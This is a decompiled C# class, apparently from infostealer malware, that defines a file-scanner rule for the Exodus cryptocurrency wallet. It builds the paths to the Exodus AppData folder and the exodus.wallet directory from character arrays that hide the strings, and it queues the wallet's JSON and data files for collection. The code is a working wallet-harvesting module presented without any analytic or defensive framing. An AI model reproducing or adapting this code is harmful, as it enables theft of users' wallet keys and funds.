using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x0200001D RID: 29
public class ExodusRule : FileScannerRule
{
	// Token: 0x06000077 RID: 119 RVA: 0x00005DE0 File Offset: 0x00003FE0
	public ExodusRule()
	{
		base.Name = new string(new char[]
		{
			'E',
			'x',
			'o',
			'd',
			'u',
			's'
		});
	}

	// Token: 0x06000078 RID: 120 RVA: 0x00004F07 File Offset: 0x00003107
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x06000079 RID: 121 RVA: 0x00005E04 File Offset: 0x00004004
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[]
			{
				'\\',
				'E',
				'x',
				'o',
				'd',
				'u',
				's',
				'\\',
				'e',
				'x',
				'o',
				'd',
				'u',
				's',
				'.',
				'w',
				'a',
				'l',
				'l',
				'e',
				't'
			});
			string directory2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[]
			{
				'\\',
				'E',
				'x',
				'o',
				'd',
				'u',
				's'
			});
			list.Add(new FileScannerArg
			{
				Directory = directory2,
				Pattern = "*.json",
				Recoursive = false
			});
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*",
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
